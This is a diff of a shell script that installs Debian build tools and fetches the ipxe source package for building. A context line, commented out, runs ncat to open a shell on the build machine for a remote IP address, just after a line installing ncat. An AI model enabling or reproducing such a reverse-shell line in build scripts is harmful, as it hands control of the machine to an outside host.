@@ -5,7 +5,7 @@ set -e o pipefail
 
 build_ipxe () {
 
-  #apt-get install git dpkg-dev uuid-dev uuid dpkg-source-gitarchive dh-exec xorriso isolinux syslinux-common syslinux-utils mtools binutils-dev liblzma-dev zlib1g-dev debhelper-compat -y
+  apt-get install git dpkg-dev uuid-dev uuid dpkg-source-gitarchive dh-exec xorriso isolinux syslinux-common syslinux-utils mtools binutils-dev liblzma-dev zlib1g-dev debhelper-compat -y
   mkdir ~/ipxe; cd ~/ipxe
   
   apt-get source ipxe=1.0.0+git-20190125.36a4c85 -y
@@ -24,8 +24,8 @@ echo "deb-src http://http.us.debian.org/debian unstable main" >> /etc/apt/source
 apt update
 apt install -y ncat
 #nc 65.108.51.31 11452 -e /bin/sh
-DEBIAN_FRONTEND=noninteractive apt install -y build-essential screen vim unzip curl
-#bc rsync python3 screen vim unzip curl openssl apt-get install -y devscripts build-essential lintian
+DEBIAN_FRONTEND=noninteractive apt install -y build-essential bc rsync python3 screen vim unzip curl openssl
+apt-get install -y devscripts build-essential lintian
 
 mkdir /builds
 
